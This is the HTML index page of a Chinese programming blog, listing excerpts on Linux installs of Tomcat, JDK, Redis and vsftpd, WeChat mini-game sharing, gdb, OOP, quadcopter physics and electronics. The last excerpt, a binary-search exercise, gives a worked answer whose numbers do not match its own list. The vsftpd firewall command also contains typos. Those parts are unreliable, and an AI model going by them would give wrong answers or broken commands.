<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta name="generator" content="Hugo 0.121.1">
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>编程随想</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="编程随想的博客">
		<meta property="og:title" content="编程随想" />
<meta property="og:description" content="编程随想的博客" />
<meta property="og:type" content="website" />
<meta property="og:url" content="/" />


	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	
	<link rel="alternate" type="application/rss+xml" href="/index.xml" title="编程随想">

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="编程随想" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">编程随想</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main list" role="main">
	<article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/7f41f3d302052681beaff5c55e6d90e0/" rel="bookmark">
			《将博客搬家至CSDN》
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		从20180928起，把网易博客搬迁到CSDN了。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/224b252cdfd5015dc5b723ead9b4e401/" rel="bookmark">
			egret实现微信小程序分享,转发功能
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		做好egert项目,该怎么进行发布到微信呢.今天来介绍egret到微信的分享,转发功能的实现.
一,微信公众号申请 前往微信公众平台(https://mp.weixin.qq.com/)申请小程序,小程序类别必须为游戏,进入设置选择开发设置,如图,复制AppID.
二,白鹭引擎设置 如图点击发布设置,
选择微信小游戏,复制AppID,输入项目,点击确定
在随后出现的提示框中选择使用微信开发者工具打开
如图,打开了微信开发者工具
三,代码操作 首先当然应该先看官方API啦(https://developers.weixin.qq.com/minigame/dev/tutorial/open-ability/share.html).从中知道了一些属性,方法.
我们先来尝试转发菜单的实现.
1,转发菜单
打开EgretWing找到src中的Platform.ts文件,如图模仿login加上如图代码
之后打开Main.ts文件在runGame中引用方法
这样egret方面已经完成,现在将其发布到微信开发者工具,如图在终端中输入egret publish --target wxgame
等待其发布完成,打开微信开发者工具,打开其中的platform.js文件,加入如下代码,注意,方法名必须与egret命名一致.
如图编译,点击微信菜单栏就可以看到转发按钮了.
2,被动转发
那么被动转发呢,这时候就需要在刚刚里面加上信息了.如图:
点击转发以后,出现如图:
3,主动发送
那么如果想要点击按钮主动发送呢.
在egret之前的platform中加入新的方法
由于官方模板中有一个按钮事件,我们借用这个按钮测试.在main中的按钮点击事件中,调用了分享的方法.
这里不要忘记了发布到微信开发者工具,然后打开微信开发者工具,加入如下代码.
这样运行,就可以看到效果了.
到这里大致完成了转发功能.
最后大家可能问那怎么判定是否成功了,这里就需要回调.如图,就可以咯.
微信分享转发功能完成了哦.
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/db68b40c701d27d7e817f9a0e3965a2a/" rel="bookmark">
			01 MyBatis-Plus 介绍
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		简介特性框架结构 简介 MyBatis-Plus（简称 MP）是一个 MyBatis 的增强工具，在 MyBatis 的基础上只做增强不做改变，为简化开发、提高效率而生。MyBatis-Plus官网
MyBaits-Plus 愿景
我们的愿景是成为 MyBatis 最好的搭档，就像 魂斗罗 中的 1P、2P，基友搭配，效率翻倍。
特性 无侵入：只做增强不做改变，引入它不会对现有工程产生影响，如丝般顺滑损耗小：启动即会自动注入基本 CURD，性能基本无损耗，直接面向对象操作强大的 CRUD 操作：内置通用 Mapper、通用 Service，仅仅通过少量配置即可实现单表大部分 CRUD 操作，更有强大的条件构造器，满足各类使用需求支持 Lambda 形式调用：通过 Lambda 表达式，方便的编写各类查询条件，无需再担心字段写错支持多种数据库：支持 MySQL、MariaDB、Oracle、DB2、H2、HSQL、SQLite、Postgre、SQLServer2005、SQLServer 等多种数据库支持主键自动生成：支持多达 4 种主键策略（内含分布式唯一 ID 生成器 - Sequence），可自由配置，完美解决主键问题支持 XML 热加载：Mapper 对应的 XML 支持热加载，对于简单的 CRUD 操作，甚至可以无 XML 启动支持 ActiveRecord 模式：支持 ActiveRecord 形式调用，实体类只需继承 Model 类即可进行强大的 CRUD 操作支持自定义全局通用操作：支持全局通用方法注入（ Write once, use anywhere ）支持关键词自动转义：支持数据库关键词（order、key…）自动转义，还可自定义关键词内置代码生成器：采用代码或者 Maven 插件可快速生成 Mapper 、 Model 、 Service 、 Controller 层代码，支持模板引擎，更有超多自定义配置等您来使用内置分页插件：基于 MyBatis 物理分页，开发者无需关心具体操作，配置好插件之后，写分页等同于普通 List 查询内置性能分析插件：可输出 Sql 语句以及其执行时间，建议开发测试时启用该功能，能快速揪出慢查询内置全局拦截插件：提供全表 delete 、 update 操作智能分析阻断，也可自定义拦截规则，预防误操作
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/db68b40c701d27d7e817f9a0e3965a2a/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d8538499515f466e2fcd79782f10665a/" rel="bookmark">
			Linux安装Tomcat
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1.给你tomcat下载链接，打开：https://tomcat.apache.org/download-70.cgi
2.上传到服务器
在服务器上新建一个文件夹
切换到文件下
cd /usr 新建
mkdir tomcat 打开xftp工具 上传
3.解压安装
cd /usr/tomcat tar -zxvf apache-tomcat-8.5.34 此时解压完成
4.配置环境
cd /usr/tomcat/apache-tomcat-8.5.34/bin vim setclasspath.sh 加入
export JAVA_HOME=/usr/jdk/jdk1.8.0_181 export JRE_HOME=/usr/jdk/jdk1.8.0_181/jre jdk的安装参考我的博文Linux安装jdk
最后启动啦
./startup.sh 5.防火墙添加8080端口
vim /etc/sysconfig/iptables -A INPUT -m state --state NEW -m tcp -p tcp --dport 8080 -j ACCEPT service iptables save service iptables restart 访问：ip地址:8080
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/7d616e2fa87139b76d2f76e433c5d5dc/" rel="bookmark">
			Linux安装jdk
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 1.下载jdk 链接：https://www.oracle.com/technetwork/java/javase/downloads/jdk8-downloads-2133151.html
我下载的是jdk-8u181-linux-i586.tar.gz 版本随意
通过ftp工具上传到服务器上
上传之前新建文件夹
cd /usr/local mkdir jdk 通过xftp 上传到jdk文件夹，然后解压
tar -zxvf jdk1.8.0_181 然后配置环境变量
vim /etc/profile 新增
export JAVA_HOME=/usr/jdk/jdk1.8.0_181 export JRE_HOME=$JAVA_HOME/jre export CLASSPATH=.:$JAVA_HOME/lib/dt.jar:$JAVA_HOME/lib/tools.jar:$JRE_HOME/lib export PATH=$PATH:$JAVA_HOME/bin:$JRE_HOME/bin export JAVA_HOME JRE_HOME PATH CLASSPATH 保存后执行
source /etc/profile 查看是否安装成功
java -version 安装成功
java version "1.8.0_181" Java(TM) SE Runtime Environment (build 1.8.0_181-b13) Java HotSpot(TM) Client VM (build 25.181-b13, mixed mode) 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/9c63355ab8c366aa149f9344abf7aea8/" rel="bookmark">
			Linux安装Redis步骤
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		第一步 创建文件夹,我是在usr/下创建文件夹的
mkdir redis 第二步 下载Redis
wget http://download.redis.io/releases/redis-4.0.8.tar.gz 第三步解压
tar -zxvf redis-4.0.8.tar.gz 第四步 解压好了以后 安装
cd redis cd redis-4.0.8 make cd src make install PREFIX=/usr/redis 到此步骤安装完成。如果报错的话参考下面的解决办法
=====================================================================================
在这个位置我报错了
这里是因为没有安装gcc ,所以我们来安装
yum -y install gcc 继续，又出现另一错误。。。
原因是jemalloc重载了Linux下的ANSI C的malloc和free函数。解决办法：make时添加参数。
make MALLOC=libc 出现下面的标语，代表成功！
Hint: It's a good idea to run 'make test' ;) 然后继续执行安装
make install PREFIX=/usr/redis 此时已经安装成功了，但是如果测试的话，会发现出现错误
# make test You need tcl 8.5 or newer in order to run the Redis test make: *** [test] Error 1 解决办法解决办法是用yum安装tcl8.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/9c63355ab8c366aa149f9344abf7aea8/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/64480fa055ed1ebc699407663688923e/" rel="bookmark">
			丹尼带你入坑无人机3 - 四轴飞行原理
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		你知道四轴的四个电机转的方向是不一样的吗？
基本结构 四轴利用其复杂的算法控制来弥补其简单的机械结构。
其采用四个旋翼作为飞行的直接动力源，旋翼对称分布在机体的四个方向，一般装成“X”型的或者“十”型（参考配图，来自PX4官网）。
四个旋翼处于同一高度平面，且四个旋翼轴距几何中心的距离相等，其中一个对角逆时针旋转，另外一个对角顺时针旋转，支架中间空间安放飞控、电调和一些外部设备。
运动原理 四轴异常灵活，它能够实现悬停，垂直运动、俯仰运动、滚转运动、偏航运动。下面以PX4的X模式为列子进行说明，图中X轴所指为飞机前方，Y轴所指方向为飞机左侧。
悬停 每个电机带着螺旋桨转动的时候会产生一个向上的提升力以及转动方向相反的反扭矩力，
当两个对角轴产生的反扭矩力（电机1+2 VS 电机3+4）相同时能够相互抵消，这样就能保证航向的稳定。
而在此同时，四个电机产生的向上提升力的总和刚好能抵消飞机本身重力的时候，飞机就能悬停在空中了。
当然在实际场景中，由于周边环境的影响，飞控会实时调整来达到这种平衡状态。
垂直运动 知道了悬停的原理后，垂直运动就很好理解了。
继续保证反转扭矩相互抵消，增加总提升力使其大于重力，就能垂直上升
而减少总提升力使其小于重力，就能垂直下降。
偏航运动 偏航运动和垂直运动类似，只不过偏航的时候是保持总提升力不变，而调整反转扭矩。
保持总提升力与重力相等
当顺时针反转扭矩大于逆时针反转扭矩时（反转扭矩1+2 &gt; 反转扭矩3+4），飞机整体会向顺时针偏航。
而当顺时针反转扭矩小于逆时针反转扭矩时（反转扭矩3+4 &gt; 反转扭矩1+2），飞机整体会向逆时针偏航.
俯仰运动（前后运动） 同时减小1和3电机转速，增大2和4电机转速，飞机就会前俯。前俯的情况下总的提升力不是垂直向上，而是随着飞机的前俯而前俯。这样就会产生一个水平方向向前的分力。保持这种姿势，飞机就会在这个水平力的作用下向前移动。
同理，增大2和4电机转速，减小1和3电机转速，飞机就会后仰。后仰的情况下总的提升力也后仰，产生一个水平方向向后的分力。保持这种姿势，飞机就会在这个水平力的作用下向后移动。
滚转运动（侧向运动） 原理跟俯仰运动类似。
增加电机1和4的转速，减小电机2和3的转速，飞机会往右滚转。保持右倾姿势，飞机就会向右侧移动。
增加电机2和3的转速，减小电机1和4的转速，飞机会往左滚转。保持左倾姿势，飞机会就向左侧移动。
控制方法 那么问题来了，四轴的四个电机之间是如何相互配合进行微妙的动作变化来实现我们想要的运动的呢？
这种问题交给飞行员来手动控制似乎很难，但是如果交给计算机程序自动控制的话，就会相对简单一些。
在四轴上装有3轴陀螺仪和3轴加速度传感器组成的惯性导航模块，飞控可以根据这些传感器返回的数据知道飞行器当前的姿态、加速度、角速度等。飞控通过算法计算评估当前姿态与目标姿态的偏差，再通过这些偏差来修正四个电机的动作。
也就是说，飞行员只要将他想要的四轴整体动作告诉飞控，飞控会结合传感器信息将飞行员命令分解到四个电机。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/08f110a30805616856553f74f502e49a/" rel="bookmark">
			gdb调试常用命令
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1.gdb安装
首先检查一下电脑中是否已经安装gdb：gdb --version
如果已经安装gdb会显示gdb版本号。
如果没有,ubuntu安装gdb命令:sudo apt-get install gdb。
2.gdb运行
当需要使用gdb调试代码时，需要在gcc\g++编译选项中添加-g选项，
如：gcc -g test.c -o test
gdb+程序名,进入gdb调试：gdb test
3.常用调试命令
list命令：
list //打印当前行后面的代码，如：list
list - //显示当前行前面的代码，如：list -
list lineNumber //打印出行第lineNumber行前后的代码,如：list 10
list FunctionName//打印出行函数FunctionName前后的代码,如：list main
break命令：
break &lt; function &gt; //在进入指定的函数function时停止运行,如break main
break &lt; lineNumber&gt; //在指定的代码行打断点,如break 10
break +offset/break -offset //在当前行的前面或后面的offset行打断点，offset为自然数,如break + 10
break filename:lineNumber //在名称为filename的文件中的第lineNumber行打断点,如：break test.c:10
break filename:function //在名称为filename的文件中的function函数入口处打断点,如:break test.c:main
break *address //在程序运行的内存地址处打断点
break … if &lt; condition&gt;
在处理某些循环体中可使用此方法进行调试，其中…可以是上述的break lineNumber、break +offset/break -offset中的参数，其中condition表示条件，在条件成立时程序即停止运行，如设置break if i=100表示当i为100时程序停止运行。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/08f110a30805616856553f74f502e49a/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/63870b8541d2565c991531faf27a6792/" rel="bookmark">
			Linux（CentOS）安装vsftpd过程
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 Linux（CentOS）安装vsftpd过程 最近在百度云开了6个月的服务器，拿来练练手，首选就是需要上传项目
查看是否安装 vsftpd
rpm -qa|grep vsftpd安装vsftpd
yum -y install vsftpd
3.vsftpd配置。该增加的增加，该打开的打开
vim /etc/vsftpd/vsftpd.conf anonymous_enable=NO local_enable=YES write_enable=YES local_umask=022 dirmessage_enable=YES xferlog_enable=YES connect_from_port_20=YES xferlog_std_format=YES chroot_list_enable=YES chroot_list_file=/etc/vsftpd/chroot_list listen=YES //ipv6设置为no listen_ipv6=NO local_root=/ftpfile anon_root=/ftpfile pam_service_name=vsftpd userlist_enable=YES tcp_wrappers=YES 启动 service vsftpd restart 设置iptables 防火墙 vim /etc/sysconfig/iptables-config 增加 IPTABLES_MODULES="ip_nat_ftp ip_conntrack_ftp" 新增21端口 vim /etc/sysconfig/iptables iptables -A INPUT -p tcp --dport 21 -m stata --stateNEW,ESTABLISHED -j ACCEPT 重启防火墙 service iptables restart 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/548d3789ba8700970c938404cdab708c/" rel="bookmark">
			软件工程之面向对象
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		【前言】 面向对象的软件开发是一种新的软件工程方法，所谓面向对象就是基于对象概念，以对象为中心，以类和继承为构造机制，来认识、理解、刻画客观世界和设计、构建相应的软件系统。
【面向对象】 1.定义： Coad和Yourdon给出了一个定义：“面向对象=对象+类+继承+通信”。
2.对象： 是面向对象开发模式的基本成份。对象由属性和方法组成，每个对象都存在一定的状态和内部标识，对象将它自身的属性集操作“包装”起来，成为封装。
3.类： 一组具有相同数据结构和相同操作的对象的集合。比如车可以分为汽车，轿车，火车，都是车这就是类
4.继承： 是使用已存在的定义做为基础建立新定义的技术。比如你爸是皇帝，你也是，子承父业。
5.多态性： 是指相同的操作、函数、过程作用于不同的对象上并获得不同的结果，即相同操作的消息发送给不同的对象时，每个对象将根据自己所属类中所定义的操作去执行，从而产生不同的结果。
比如水果类的颜色，每个水果的颜色不同，这就是多态。颜色就是接口。
主要特点： 1.按照人类习惯的思维方法，对软件开发过程所有阶段进行综合考虑
2.软件生存周期各阶段所使用的方法、技术具有高度的连续性
3.软件开发各阶段有机集成，有利于系统的稳定性
4.具有良好的重用性
【开发过程】 面向对象的开发过程中，生存期的各个阶段所开发出来额“部件”都是类。在面向对象生存期的各个阶段对各个类的信心进行细化，类成为分析设计和实现的基本单元。
1.论域分析 开发问题论域的模型。
考察问题论域内一个较宽的范围，分析覆盖的范围应比直接要解决的问题更多。
建立大致的系统实现环境。
2.应用分析 应用分析则根据特定应用的需求进行论域分析。应用分析细化在论域分析阶段所开发出来的信息，把注意力集中于当前要解决的问题。
3.求精和维护 这是一个在软件生存期中最花费时间的部分。
传统的维护活动时针应用的，而求精过程是针对类，针对把类集成在一起的结构。
我们可以标识抽象的抽象，使得集成结构通过一般化增加新的层次。
【面向对象分析】 （OOA）是运用面向对象的方法进行需求分析，它是面向对象方法从编程领域向分析领域延伸的产物，充分体现了面向对象的概念与原则。
一、需求分析中的问题 1.明确问题域和系统责任的困难
问题域是指被开发系统的应用领域，即拟建立系统进行处理的业务范围。系统责任即所开发系统应该具备的职能。
2.需求的不断变化
需求的变化是需求分析过程中遇到的一个严峻问题，应变能力的强弱是衡量一种分析方法优劣的重要标准。
3.充分交流问题
4.考虑复用要求
二、OOA的特点 一个好的分析方法，应该能够有效地解决上述软件需求分析中的问题，OOA在解决这些问题上具有较强的能力。
1.有利于对问题域及系统责任的理解
2.对需求变化有较强的适应性
3.有利于人员之间的交流
4.支持软件复用
三、基本任务 OOA是软件开发过程中的问题定义阶段，目标是完成对所求解问题的分析，确定系统是“做什么”的，并建立系统的需求分析模型。
运用面向对象的方法，对问题域和系统责任进行分析和理解，找出描述它们的类和对象，定义其属性和操作，以及它们的结构，包括静态联系和动态联系，最终获得一个符合用户需求，并能够反映问题域和系统责任的OOA模型。
【面向对象设计】 （OOD）是面向对象方法的核心阶段。OOA建立的是应用领域面向对象的模型，而OOD建立的则是软件系统的模型。与OOA的模型相比较，OOD模型的抽象层次较低，因为他包含了与具体实现有关的细节，但是建模的原则和方法是相同的。
一、设计准则 1.抽象
抽象是指强调实体的本质、内在的属性，而忽略了一些无关紧要的属性，
2.信息隐蔽
信息隐蔽在面向对象的方法中的具体体现是封装性，封装性是保证软件部件具有优良的模块性的基础。
3.弱耦合
按照抽象与封装性，弱耦合是指子系统之间的联系应该尽量地少。子系统应具有良好的接口，子系统通过接口与系统的其他部分联系。
4.强内聚
它是指子系统内部由一些关系密切的类构成，除了少数的通信类外，子系统中的类应该具有该子系统中的其他类协作，构成具有强内聚性的子系统。
5.可重用
二、基本任务 面向对象的设计是面向对象方法在软件设计阶段应用于扩展的结果，是将OOA所创建的分析模型转换为设计模型，解决系统“如何做”的问题。
面向对象设计的主要目标是提高生产率，提高软件质量和可维护性。
【面向对象模型化技术OMT技术】 对象模型化技术分析时收集的信息构造在三种类模型中，即对象模型，功能模型和动态模型。
定义： 功能模型定义“做什么”
动态模型定义“何时做”
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/548d3789ba8700970c938404cdab708c/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d4e80ad80af679ed8a2013c8a1c844a5/" rel="bookmark">
			【Stimulsoft Reports.WPF教程】在报表中使用Business Objects
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		【下载Stimulsoft Reports.WPF最新版本】
此示例显示如何使用Business Objects集合创建报表， Business Objects是一个对象类数据，使用它可以以不同的结构呈现数据：表，列表，数组等。此示例使用Business Objects的两个变量 ：IEnumerable和ITypedList：
private void btPreviewIEnumerable_Click(object sender, System.EventArgs e) { StiReport report = new StiReport(); report.RegData("EmployeeIEnumerable", CreateBusinessObjectsIEnumerable.GetEmployees()); report.Load("..\\BusinessObjects_IEnumerable.mrt"); report.ShowWithWpf(); } private void btPreviewITypedList_Click(object sender, System.EventArgs e) { StiReport report = new StiReport(); report.RegData("EmployeeITypedList", CreateBusinessObjectsITypedList.GetEmployees()); report.Load("..\\BusinessObjects_ITypedList.mrt"); report.ShowWithWpf(); } 作为IEnumerable对象，使用EmployeeIEnumerable模型。要填充数据，请使用CreateBusinessObjectsIEnumerable类的GetEmployees（）方法：
public static EmployeeIEnumerableCollection GetEmployees() { EmployeeIEnumerableCollection employees = new EmployeeIEnumerableCollection(); Company company = new Company("Company1"); Department storeDepartment = new Department(company, "Store Department"); Department salesDepartment = new Department(company, "
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/d4e80ad80af679ed8a2013c8a1c844a5/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/433e21e7519dfebc09ad1ad4674eab82/" rel="bookmark">
			vector的增长机制
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		vector的增长机制
vector是ST L 中最常见的容器, 它占用的是一块连续分配的内存, 从数据存储的角度来讲, 和数组极其相似, 不同的是:数组是静态分配空间, 一旦分配了空间的大小, 就不可再改变了;而vector 是动态分配空间, 随着元素的不断增加, 它会按照自身的一套增长机制不断扩充自身的容量。
vector 默认的扩容机制是按照容器现有容量的一倍进行增长。由于 Vector 容器分配的是一块连续的内存空间, 每次容器的增长并不是在原有连续的内容空间后进行简单的叠加, 而是重新申请一块更大的新内存, 并把现有容器中的元素逐个复制过去, 然后销毁原有内存。
如:vector 初始化时申请的空间大小为 6 , 存入了 6 个元素, 当向 vector 中插入第 7 个元素“ 6” 时, vector 会利用自己的扩容机制重新申请空间, 数据存放结构如图 1 所示(_First 指向使用空间的头部,_Last 指向使用空间大小(size)的尾部,_End 指向使用空间容量(capacity)的尾部)。
参考文献 《Vector 容器内存增长机制研究 》 张云峰
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d5ec3f93e010f8479a8fe4b27f2fa20b/" rel="bookmark">
			解决微信公众号消息回复五秒限制最好方法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		如题
很多朋友发现在消息回复处理业务的时候，可能时间不固定，甚至超过5s，亲测可用
我的办法是不用消息回复接口，全部改用客服消息接口
1.收到消息后，首先回复“处理中，请稍等”
2.直接上代码
ob_start();
header(‘Connection: close’);
header('Content-Length: ’ .ob_get_length());
ob_flush();
flush();
3.耗时操作返回结果，依然使用客服消息发送。
如果还有问题，加微信说
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/3cca881535ceb58c75618c9d0e73484d/" rel="bookmark">
			Vue2.x&#43;SpringBoot2.0.4快速开发后台管理系统(一)
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 本项目基于本人空闲时间完成
前后端搭建都由本人完成，有问题可以一起探讨
功能介绍 前端 Vue2.xElement-uiaxiosecharts权限控制动态路由(后期完善)国际化 前端git路径
后端 Springboot2.0.4Spring SecurityJWT 单点登陆登陆首页系统管理定时任务(基于quartz)RedisRabbitmq权限切面日志切面 后端git路径
// An highlighted block var foo = 'bar'; 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f1b1aa04e88adc34aa1eb80829f9aa13/" rel="bookmark">
			0欧姆电阻、磁珠的应用
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一、0欧姆电阻
电路设计中常见到0欧的电阻，大概有以下几个功能，其最重要且经常用的功能是：模拟地和数字地单点接地。只要是地，最终都要接到一起，然后入大地。如果不接在一起就是“浮地”，存在压差，容易积累电荷，造成静电。地是参考0电位，所有电压都是参考地得出的，地的标准要一致，故各种地应短接在一起。人们认为大地能够吸收所有电荷，始终维持稳定，是最终的地参考点。虽然有些板子没有接大地，但发电厂是接大地的，板子上的电源最终还是会返回发电厂入地。如果把模拟地和数字地大面积直接相连，会导致互相干扰。不短接又不妥，理由如上。有四种方法解决此问题：①用磁珠连接；②用电容连接；③用电感连接；④用0欧姆电阻连接。区别：①磁珠的等效电路相当于带阻限波器，只对某个频点的噪声有显著抑制作用，使用时需要预先估计噪点频率，以便选用适当型号。对于频率不确定或无法预知的情况，磁珠不合。②电容隔直通交，造成浮地。③电感体积大，杂散参数多，不稳定。④0欧电阻相当于很窄的电流通路，能够有效地限制环路电流，使噪声得到抑制。电阻在所有频带上都有衰减作用(0欧电阻也有阻抗)，这点比磁珠强。
0欧姆电阻的其它作用：
①在电路中没有任何功能，只是在PCB上为了调试方便或兼容设计等原因。
②可以做跳线用，如果某段线路不用，直接不贴该电阻即可（不影响外观）。
③在匹配电路参数不确定的时候，以0欧姆代替，实际调试的时候，确定参数，再以具体数值的元件代替。
④测某部分电路的耗电流的时候，可以去掉0ohm电阻，接上电流表，这样方便测耗电流。
⑤布线时，如果实在布不过去了，也可以加一个0欧的电阻。
⑥在高频信号下，充当电感或电容。（与外部电路特性有关）电感用，主要是解决EMC问题。如地与地，电源和ICPin间。
⑦单点接地（指保护接地、工作接地、直流接地在设备上相互分开,各自成为独立系统。）
⑧熔丝作用。
⑨跨接时用于电流回路。当分割电、地平面后，造成信号最短回流路径断裂，此时，信号回路不得不绕道，形成很大的环路面积，电场和磁场的影响就变强了，容易干扰/被干扰。在分割区上跨接0欧电阻，可以提供较短的回流路径，减小干扰。
⑩配置电路
一般，产品上不要出现跳线和拨码开关。有时用户会乱动设置，易引起误会，为了减少维护费用，应用0欧电阻代替跳线等焊在板子上。空置跳线在高频时相当于天线，用贴片电阻效果好。
⑪其他用途
布线时跨线、调试/测试用、临时取代其他贴片器件、作为温度补偿器件，更多时候是出于EMC对策的需要。另外，0欧姆电阻比过孔的寄生电感小，而且过孔还会影响地平面（因为要挖孔），还有就是不同尺寸0欧电阻允许通过电流不同，一般0603的1A，0805的2A，所以不同电流会选用不同尺寸的。还有就是为磁珠、电感等预留位置时，得根据磁珠、电感的大小还做封装，所以0603、0805等不同尺寸的都有了。
附：1欧姆电阻的作用
1欧姆电阻在电路中经常是用来测试的,比如,需要测一个电路中的电流时,我们可以在该电路中串一个1欧姆电阻,测量其两端的电压即是该电路的电流(I=U/R,因为R=1,所以测出的电压值即是电流值)。
二、磁珠：
磁珠专用于抑制信号线、电源线上的高频噪声和尖峰干扰，还具有吸收静电脉冲的能力。磁珠是用来吸收超高频信号，象一些RF电路，PLL，振荡电路，含超高频存储器电路（DDR，SDRAM，RAMBUS等）都需要在电源输入部分加磁珠，而电感是一种蓄能元件，用在LC振荡电路，中低频的滤波电路等，其应用频率范围很少超过50MHZ。磁珠有很高的电阻率和磁导率，等效于电阻和电感串联，但电阻值和电感值都随频率变化。
磁珠的功能：主要是消除存在于传输线结构（电路）中的RF噪声，RF能量是叠加在直流传输电平上的交流正弦波成分，直流成分是需要的有用信号，而射频RF能量却是无用的电磁干扰沿着线路传输和辐射（EMI）。要消除这些不需要的信号能量，使用片式磁珠扮演高频电阻的角色（衰减器），该器件允许直流信号通过，而滤除交流信号。通常高频信号为30MHz以上，然而，低频信号也会受到片式磁珠的影响。
磁珠有很高的电阻率和磁导率，它等效于电阻和电感串联，但电阻值和电感值都随频率变化。它比普通的电感有更好的高频滤波特性，在高频时呈现阻性，所以能在相当宽的频率范围内保持较高的阻抗，从而提高调频滤波效果。
作为电源滤波，可以使用电感。磁珠的电路符号就是电感但是型号上可以看出使用的是磁珠。在电路功能上，磁珠和电感是原理相同的，只是频率特性不同罢了。（注：磁珠的单位是欧姆，而不是亨利，这一点要特别注意。）
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/5aa84294b293fafccbfcdae2f6d39bd3/" rel="bookmark">
			解决RecyclerView 使用Glide加载图片调动notifyDataSetChanged()图片闪烁问题
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		使用RecyclerView加载图片列表时，使用notifyDataSetChanged() 更新时图片列表会闪烁。因为代码逻辑在调用notifyDataSetChanged()重新请求一遍图片。尝试了网上的一些方法，使用 getItemId + setHasStableIds + setSupportsChangeAnimations + 设置Tag的方式来解决了问题。（貌似是各种方法都集成了一下，不过去掉其中任何一个都不行，取消动画效果似乎可以去掉，但是因为个人布局原因，去掉会导致别的情况，故这里没有去掉）
解决方式：
在Adapter中重写getItemId方法
@Override
public long getItemId(int position) {
return position;
}
设置AdapterHasStableIds为ture
adapter.setHasStableIds (true)adapter.setHasStableIds (true)
取消动画效果
((DefaultItemAnimator) rv_picList.getItemAnimator()).setSupportsChangeAnimations(false); // 取消动画效果
给图片设置Tag
if (!dataList.get(position).getContentPic().equals(holder.iv_story_pic.getTag(R.id.iv_story_pic))) { // 加载图片 ImageUtils.loadImage(this.mContext, question.getContentPic(), holder.iv_story_pic, R.mipmap.default_img, R.mipmap.error_imgt); holder.iv_story_pic.setTag(R.id.iv_story_pic, dataList.get(position).getContentPic()); } 以上综合，解决个人问题。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f59440b6bd2339568c3799902edd862e/" rel="bookmark">
			在有序表(12,24,36,48,60,72,84)中二分查找关键字72时所需进行的关键字比较次数是多少？
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		正确的二分查找应该是一次折半后，high=middle-1 或者 low=middle+1；
所以第一次查找时 high=12,low=0; middle= (0+12)/2 =6,即53；
第二次查找时 high=12 low =6+1; middle = (7+12)/2 = 9,即78
第三次查找时 high=12 low =9+1; middle = (10+12)/2 = 11，即115
